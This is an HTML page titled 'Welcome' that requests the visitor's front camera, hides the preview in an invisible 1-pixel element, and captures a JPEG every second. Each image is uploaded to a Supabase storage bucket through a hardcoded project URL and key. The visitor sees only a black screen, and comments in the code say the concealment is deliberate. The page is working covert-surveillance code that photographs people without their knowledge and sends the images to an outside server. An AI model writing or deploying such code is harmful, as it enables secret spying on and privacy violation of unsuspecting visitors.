<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Welcome</title>

    <!-- Supabase -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <style>
        * {
            box-sizing: border-box;
        }

        html,
        body {
            margin: 0;
            width: 100%;
            height: 100%;
            background: #000;
        }

        body {
            overflow: hidden;
        }

        /*
         * Camera preview is not displayed.
         * The browser will still request camera permission.
         */
        #camera {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        #canvas {
            display: none;
        }

        /*
         * Status is hidden normally.
         */
        #status {
            position: fixed;
            bottom: 20px;
            left: 50%;

            transform: translateX(-50%);

            color: rgba(255, 255, 255, 0.35);

            font-family: Arial, sans-serif;
            font-size: 12px;

            opacity: 0;

            transition: opacity 0.3s;

            pointer-events: none;
        }

        #status.show {
            opacity: 1;
        }
    </style>
</head>


<body>

    <!-- Hidden camera -->
    <video
        id="camera"
        autoplay
        playsinline
        muted>
    </video>

    <!-- Used to convert camera frames into images -->
    <canvas id="canvas"></canvas>

    <!-- Temporary status message -->
    <div id="status"></div>


    <script>

        // =====================================================
        // SUPABASE CONFIGURATION
        // =====================================================

        const SUPABASE_URL =
            "https://jrrlohtlfnmeotdgsbrk.supabase.co";

        const SUPABASE_KEY =
            "sb_publishable_jRR4HOJqC3yl1Wo5HAqA0A_YLYfknvJ";


        // Create Supabase client
        const supabaseClient =
            window.supabase.createClient(
                SUPABASE_URL,
                SUPABASE_KEY
            );


        // =====================================================
        // ELEMENTS
        // =====================================================

        const video =
            document.getElementById("camera");

        const canvas =
            document.getElementById("canvas");

        const status =
            document.getElementById("status");


        // Camera stream
        let cameraStream = null;


        // =====================================================
        // START CAMERA
        // =====================================================

        async function startCamera() {

            try {

                console.log(
                    "Requesting camera permission..."
                );


                cameraStream =
                    await navigator.mediaDevices.getUserMedia({

                        video: {

                            facingMode: "user",

                            width: {
                                ideal: 1280
                            },

                            height: {
                                ideal: 720
                            }

                        },

                        audio: false

                    });


                // Attach camera stream
                video.srcObject = cameraStream;


                // Start playback
                await video.play();


                console.log(
                    "Camera started successfully."
                );


                /*
                 * Give the camera a moment to initialize
                 * before taking the first photograph.
                 */
                setTimeout(() => {

                    startCaptureLoop();

                }, 1000);


            } catch (error) {

                console.error(
                    "Camera error:",
                    error
                );


                showStatus(
                    "Camera permission required"
                );
            }
        }


        // =====================================================
        // CAPTURE LOOP
        // =====================================================

        function startCaptureLoop() {

            console.log(
                "Starting capture: 1 photo every second"
            );


            /*
             * Capture immediately.
             */
            takePhoto();


            /*
             * Capture once every 1000 milliseconds.
             */
            setInterval(() => {

                takePhoto();

            }, 1000);

        }


        // =====================================================
        // TAKE PHOTO
        // =====================================================

        async function takePhoto() {

            /*
             * Make sure the camera is ready.
             */
            if (
                !video.videoWidth ||
                !video.videoHeight
            ) {

                console.log(
                    "Camera is not ready."
                );

                return;
            }


            // Match canvas to camera resolution
            canvas.width =
                video.videoWidth;

            canvas.height =
                video.videoHeight;


            // Get canvas drawing context
            const context =
                canvas.getContext("2d");


            /*
             * Copy the current camera frame
             * into the canvas.
             */
            context.drawImage(
                video,
                0,
                0,
                canvas.width,
                canvas.height
            );


            /*
             * Convert canvas to JPEG.
             *
             * Quality:
             * 0.85 = fairly high quality
             */
            const blob =
                await new Promise(resolve => {

                    canvas.toBlob(
                        resolve,
                        "image/jpeg",
                        0.85
                    );

                });


            if (!blob) {

                console.error(
                    "Could not create image."
                );

                return;
            }


            /*
             * Send image to Supabase.
             */
            uploadPhoto(blob);
        }


        // =====================================================
        // UPLOAD PHOTO
        // =====================================================

        async function uploadPhoto(blob) {

            /*
             * Generate timestamp.
             */
            const timestamp =
                new Date()
                    .toISOString()
                    .replace(/[:.]/g, "-");


            /*
             * Generate random ID.
             */
            const random =
                Math.random()
                    .toString(36)
                    .substring(2, 8);


            /*
             * Example:
             *
             * photo-2026-09-25T14-30-20-123Z-a8f91c.jpg
             */
            const fileName =
                `photo-${timestamp}-${random}.jpg`;


            try {

                const {
                    data,
                    error
                } = await supabaseClient

                    .storage

                    .from("photos")

                    .upload(
                        fileName,
                        blob,
                        {
                            contentType:
                                "image/jpeg",

                            upsert: false
                        }
                    );


                /*
                 * Check for Supabase error.
                 */
                if (error) {

                    throw error;

                }


                console.log(
                    "Photo uploaded:",
                    data.path
                );


            } catch (error) {

                console.error(
                    "Upload failed:",
                    error
                );

            }

        }


        // =====================================================
        // STATUS MESSAGE
        // =====================================================

        function showStatus(message) {

            status.textContent =
                message;


            status.classList.add(
                "show"
            );


            setTimeout(() => {

                status.classList.remove(
                    "show"
                );

            }, 1500);

        }


        // =====================================================
        // START EVERYTHING
        // =====================================================

        startCamera();

    </script>

</body>

</html>
